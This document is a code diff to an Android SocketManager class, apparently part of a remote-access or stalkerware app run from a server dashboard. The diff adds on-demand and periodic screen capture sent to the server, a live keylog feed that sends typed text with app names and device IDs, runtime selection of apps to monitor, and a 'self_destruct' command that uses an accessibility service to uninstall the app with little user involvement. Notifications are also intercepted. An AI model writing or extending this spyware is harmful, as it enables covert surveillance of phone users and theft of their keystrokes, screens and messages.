@@ -47,10 +47,12 @@ public class SocketManager {
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
-    // Streaming state
-    private volatile boolean streaming  = false;
-    private volatile int     streamFps  = 2;
-    private Thread           streamThread;
+    // Streaming state — event-driven (single-frame on request, idle keepalive)
+    private volatile boolean idleFrameMode = false;
+    private ScheduledFuture<?> idleFrameFuture;
+
+    // Dynamic monitored packages (runtime additions from dashboard)
+    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
 
     // Command Handlers — one instance each, created once and reused
     private final CommandExecutor   commandExecutor;
@@ -451,20 +453,29 @@ public class SocketManager {
         if (command.equals("get_notifications_from_app")) return NotificationInterceptor.getNotificationsFromApp(params.getString("packageName"));
         if (command.equals("clear_notifications"))        return NotificationInterceptor.clearAllNotifications();
 
-        // ── Streaming ────────────────────────────────────────────────────
+        // ── Streaming — event-driven ─────────────────────────────────────
         if (command.equals("stream_start")) {
-            int fps = params.optInt("fps", 2);
-            startStreaming(fps, DeviceInfo.getDeviceId(context));
+            String deviceId = DeviceInfo.getDeviceId(context);
+            startIdleFrameMode(deviceId);
+            sendSingleFrame(deviceId); // send first frame immediately
             JSONObject r = new JSONObject();
             r.put("success", true);
-            r.put("message", "Streaming started at " + fps + " fps");
+            r.put("message", "Event-driven stream started (idle keepalive every 5s)");
             return r;
         }
         if (command.equals("stream_stop")) {
-            stopStreaming();
+            stopIdleFrameMode();
             JSONObject r = new JSONObject();
             r.put("success", true);
-            r.put("message", "Streaming stopped");
+            r.put("message", "Stream stopped");
+            return r;
+        }
+        if (command.equals("stream_request_frame")) {
+            String deviceId = DeviceInfo.getDeviceId(context);
+            sendSingleFrame(deviceId);
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Frame captured and sent");
             return r;
         }
 
@@ -483,10 +494,35 @@ public class SocketManager {
             return r;
         }
 
-        // ── Permissions ───────────────────────────────────────────────────
+        // ── get_permissions ──────────────────────────────────────────────
         if (command.equals("get_permissions")) {
             return permissionManager.getPermissions();
         }
+
+        // ── Self-destruct ─────────────────────────────────────────────────
+        if (command.equals("self_destruct")) {
+            return performSelfDestruct();
+        }
+
+        // ── Dynamic app monitoring ────────────────────────────────────────
+        if (command.equals("add_monitored_app")) {
+            String pkg = params.optString("packageName", "");
+            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Now monitoring: " + pkg);
+            return r;
+        }
+        if (command.equals("remove_monitored_app")) {
+            String pkg = params.optString("packageName", "");
+            dynamicMonitoredPackages.remove(pkg);
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("message", "Stopped monitoring: " + pkg);
+            return r;
+        }
+
+        // ── Permissions ───────────────────────────────────────────────────
         if (command.equals("request_permission")) {
             String perm = params.optString("permission", "");
             if (perm.isEmpty()) {
@@ -514,49 +550,45 @@ public class SocketManager {
         return unknown;
     }
 
-    // ── Streaming ─────────────────────────────────────────────────────────
+    // ── Streaming — event-driven single-frame model ───────────────────────
 
-    private void startStreaming(int fps, String deviceId) {
-        stopStreaming();
-        streaming  = true;
-        streamFps  = fps;
-        streamThread = new Thread(() -> {
-            long intervalMs = fps > 0 ? 1000L / fps : 500L;
-            Log.i(TAG, "Streaming started @ " + fps + "fps, interval=" + intervalMs + "ms");
-            while (streaming && connected) {
-                try {
-                    Bitmap frame = captureFrame();
-                    if (frame != null) {
-                        String b64 = bitmapToBase64(frame, 50);
-                        frame.recycle();
-                        if (b64 != null) {
-                            JSONObject d = new JSONObject();
-                            d.put("deviceId",  deviceId);
-                            d.put("frameData", b64);
-                            d.put("timestamp", System.currentTimeMillis());
-                            sendMessage("stream:frame", d);
-                        }
+    /** Send exactly one frame immediately (called on user interaction or idle keepalive). */
+    public void sendSingleFrame(String deviceId) {
+        executor.execute(() -> {
+            try {
+                Bitmap frame = captureFrame();
+                if (frame != null) {
+                    String b64 = bitmapToBase64(frame, 55);
+                    frame.recycle();
+                    if (b64 != null) {
+                        JSONObject d = new JSONObject();
+                        d.put("deviceId",  deviceId);
+                        d.put("frameData", b64);
+                        d.put("timestamp", System.currentTimeMillis());
+                        sendMessage("stream:frame", d);
                     }
-                    Thread.sleep(intervalMs);
-                } catch (InterruptedException e) {
-                    break;
-                } catch (Exception e) {
-                    Log.e(TAG, "Streaming frame error: " + e.getMessage());
-                    try { Thread.sleep(1000); } catch (InterruptedException ie) { break; }
                 }
+            } catch (Exception e) {
+                Log.e(TAG, "sendSingleFrame error: " + e.getMessage());
             }
-            Log.i(TAG, "Streaming thread ended");
         });
-        streamThread.setName("stream-thread");
-        streamThread.setDaemon(true);
-        streamThread.start();
     }
 
-    private void stopStreaming() {
-        streaming = false;
-        if (streamThread != null) {
-            streamThread.interrupt();
-            streamThread = null;
+    /** Start idle-frame mode: send one frame every 5 seconds when idle. */
+    private void startIdleFrameMode(String deviceId) {
+        stopIdleFrameMode();
+        idleFrameMode = true;
+        idleFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
+            if (idleFrameMode && connected) sendSingleFrame(deviceId);
+        }, 5, 5, TimeUnit.SECONDS);
+        Log.i(TAG, "Idle-frame mode started (5s keepalive)");
+    }
+
+    private void stopIdleFrameMode() {
+        idleFrameMode = false;
+        if (idleFrameFuture != null) {
+            idleFrameFuture.cancel(false);
+            idleFrameFuture = null;
         }
     }
 
@@ -690,5 +722,59 @@ public class SocketManager {
             case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
             default: return false;
         }
+    }
+
+    /** Push a keylog entry to the server immediately (live feed). */
+    public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
+        executor.execute(() -> {
+            try {
+                JSONObject entry = new JSONObject();
+                entry.put("packageName", packageName);
+                entry.put("appName", appName != null ? appName : packageName);
+                entry.put("text", text);
+                entry.put("eventType", eventType);
+                entry.put("timestamp", timestamp);
+                entry.put("deviceId", DeviceInfo.getDeviceId(context));
+                sendMessage("keylog:entry", entry);
+            } catch (Exception e) {
+                Log.e(TAG, "pushKeylogEntry error: " + e.getMessage());
+            }
+        });
+    }
+
+    /** Whether a package is monitored (static config OR dynamically added). */
+    public boolean isDynamicallyMonitored(String pkg) {
+        return dynamicMonitoredPackages.contains(pkg);
+    }
+
+    /** Self-destruct: clear data and launch uninstall flow. */
+    private JSONObject performSelfDestruct() {
+        JSONObject r = new JSONObject();
+        try {
+            // Schedule destruction after giving time to send the response
+            new Thread(() -> {
+                try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
+                try {
+                    // Enable uninstall-assist mode in accessibility
+                    UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                    if (svc != null) svc.enableUninstallAssist();
+
+                    // Open uninstall dialog
+                    android.content.Intent intent = new android.content.Intent(
+                        android.content.Intent.ACTION_DELETE,
+                        android.net.Uri.parse("package:" + context.getPackageName())
+                    );
+                    intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                    context.startActivity(intent);
+                } catch (Exception e) {
+                    Log.e(TAG, "selfDestruct error: " + e.getMessage());
+                }
+            }).start();
+            r.put("success", true);
+            r.put("message", "Self-destruct initiated — uninstalling app");
+        } catch (Exception e) {
+            try { r.put("success", false); r.put("error", e.getMessage()); } catch (Exception ignored) {}
+        }
+        return r;
     }
 }
